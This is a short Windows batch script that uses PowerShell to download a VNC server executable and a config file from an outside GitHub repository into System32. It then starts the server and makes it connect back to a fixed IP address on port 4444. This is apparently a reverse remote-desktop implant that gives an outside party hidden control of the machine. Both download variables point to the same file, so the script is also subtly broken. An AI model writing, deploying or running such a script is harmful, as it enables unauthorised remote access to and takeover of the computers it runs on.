@echo off
:: Define URLs for the files
set "url_winvc=https://github.com/kVenom-X/tls/blob/main/winvnc.exe"
set "url_ultravnc_ini=https://github.com/kVenom-X/tls/blob/main/winvnc.exe"

:: Define the destination directory
set "dest_dir=%SystemRoot%\System32"

:: Download winvnc.exe
powershell -Command "Invoke-WebRequest -Uri %url_winvc% -OutFile %dest_dir%\winvnc.exe"

:: Download ultravnc.ini
powershell -Command "Invoke-WebRequest -Uri %url_ultravnc_ini% -OutFile %dest_dir%\ultravnc.ini"

:: Execute winvnc.exe
start winvnc.exe -run
timeout /t 1 >nul
start winvnc.exe -connect 192.168.1.207::4444